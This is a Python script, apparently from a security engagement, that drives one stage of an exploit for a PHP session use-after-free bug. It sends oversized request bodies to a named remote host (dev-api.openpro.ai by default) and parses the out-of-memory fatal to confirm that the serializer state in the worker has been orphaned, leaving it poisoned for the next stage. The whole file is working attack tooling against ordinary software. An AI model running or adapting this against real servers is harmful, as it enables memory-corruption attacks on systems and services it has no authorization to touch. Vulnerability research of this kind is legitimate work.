#!/usr/bin/env python3
"""arm_delta.py — classify the startup fatal by its allocation delta.

The fatal line reports "... exhausted (tried to allocate N bytes) in Unknown on
line 0". Compare N with the filename length F we sent:

    N - F == 32          the parser's exact zend_string copy of the filename
                         -> the serialize had already finished and cleaned up
                         -> nothing is orphaned, no UAF
    N - F == 0..2        a stream/socket buffer of the body
                         -> same, outside the serializer
    N - F > 100          a growing smart_str inside php_var_serialize()
                         -> level=1 was set and its destroy never ran
                         -> BG(serialize) is orphaned  (gdb-verified, docs/03 §3.12)

So the delta alone tells you, from outside, whether the arm actually poisoned the
worker. Verified against gdb on the local build for every case in
engagements/2026-10-php-session-uaf/lab/sweep_arm.py.

Usage:
  python3 arm_delta.py --host dev-api.openpro.ai --sizes 72000000,80000000,88000000
"""
import argparse
import os
import re
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import remote_probe as rp  # noqa: E402


def attempt(host, size, timeout, log):
    body = rp.build_body(size)
    r = rp.send(host, "/", body, "uafarm" + os.urandom(8).hex(), timeout,
                f"arm {size/1e6:.0f}MB", log)
    m = re.search(r"tried to allocate (\d+) bytes", r.get("oom_line", ""))
    return int(m.group(1)) if m else None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="dev-api.openpro.ai")
    ap.add_argument("--sizes", required=True)
    ap.add_argument("--attempts", type=int, default=3,
                    help="retry a size until the fatal text is captured (it is not always rendered)")
    ap.add_argument("--timeout", type=int, default=180)
    ap.add_argument("--log", default="")
    a = ap.parse_args()

    fh = open(a.log, "a", buffering=1) if a.log else None
    def log(*xs):
        line = " ".join(str(x) for x in xs)
        print(line, flush=True)
        if fh:
            fh.write(line + "\n")

    log(f"\n=== {time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())} arm_delta {a.host} ===")
    for i, size in enumerate([int(x) for x in a.sizes.split(",") if x.strip()]):
        alloc = None
        for k in range(a.attempts):
            alloc = attempt(a.host, size, a.timeout, log)
            if alloc:
                break
        if not alloc:
            log(f"  {size/1e6:5.0f}MB  fatal text not rendered in {a.attempts} attempts "
                f"(the 200/empty-body response still means it died)")
            continue
        delta = alloc - size
        if delta > 100:
            verdict = "INSIDE the serializer -> BG(serialize) orphaned"
        elif abs(delta) <= 2:
            verdict = "outside (body buffer) -> nothing orphaned"
        else:
            verdict = "outside (parser zend_string) -> nothing orphaned"
        log(f"  {size/1e6:5.0f}MB  alloc={alloc}  delta=+{delta}  {verdict}")
    if fh:
        fh.close()


if __name__ == "__main__":
    main()
